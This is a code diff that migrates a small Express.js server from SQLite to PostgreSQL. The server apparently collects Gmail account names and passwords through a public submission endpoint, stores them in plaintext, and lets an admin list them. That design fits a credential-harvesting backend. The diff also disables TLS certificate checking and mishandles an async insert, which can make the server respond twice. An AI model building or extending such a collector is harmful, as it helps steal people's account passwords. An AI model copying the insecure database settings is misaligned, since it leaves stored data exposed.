@@ -1,24 +1,37 @@
+require("dotenv").config();
 const express = require("express");
 const session = require("express-session");
-const Database = require("better-sqlite3");
+const { Pool } = require("pg");
 const path = require("path");
 
 const app = express();
-const db = new Database("data.db");
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL,
+  ssl: { rejectUnauthorized: false }
+});
 
 // Change these before deploying.
 const ADMIN_USERNAME = process.env.ADMIN_USERNAME;
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
 
-db.exec(`
+async function initDatabase() {
+  await pool.query(`
   CREATE TABLE IF NOT EXISTS submissions (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    id SERIAL PRIMARY KEY,
     gmail_account TEXT NOT NULL,
     server TEXT NOT NULL,
     password TEXT,
-    created_at TEXT NOT NULL DEFAULT (datetime('now','localtime'))
+    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
   )
 `);
+
+console.log("PostgreSQL database ready.");
+}
+
+initDatabase().catch((err) => {
+  console.error("Database initialization failed:", err);
+  process.exit(1);
+});
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
@@ -48,15 +61,18 @@ app.post("/api/submit", (req, res) => {
     });
   }
 
-  db.prepare(`
+  pool.query(`
     INSERT INTO submissions
     (gmail_account, server, password)
-    VALUES (?, ?, ?)
-  `).run(
+    VALUES ($1, $2, $3)
+  `, [
     String(gmail_account).trim(),
     String(server).trim(),
     String(password || "").trim()
-  );
+  ]).catch((err) => {
+    console.error("Error inserting submission:", err);
+    res.status(500).json({ error: "Internal server error." });
+  });
 
   res.json({ ok: true });
 });
@@ -75,16 +91,24 @@ app.post("/api/admin/logout", (req, res) => {
 });
 
 app.get("/api/admin/submissions", requireAdmin, (req, res) => {
-  const rows = db.prepare(`
+  pool.query(`
     SELECT id, gmail_account, server, password, created_at
     FROM submissions ORDER BY id DESC
-  `).all();
-  res.json(rows);
+  `).then((result) => {
+    res.json(result.rows);
+  }).catch((err) => {
+    console.error("Error fetching submissions:", err);
+    res.status(500).json({ error: "Internal server error." });
+  });
 });
 
 app.delete("/api/admin/submissions/:id", requireAdmin, (req, res) => {
-  db.prepare("DELETE FROM submissions WHERE id = ?").run(req.params.id);
-  res.json({ ok: true });
+  pool.query("DELETE FROM submissions WHERE id = $1", [req.params.id]).then(() => {
+    res.json({ ok: true });
+  }).catch((err) => {
+    console.error("Error deleting submission:", err);
+    res.status(500).json({ error: "Internal server error." });
+  });
 });
 
 app.get("/api/admin/me", (req, res) => {
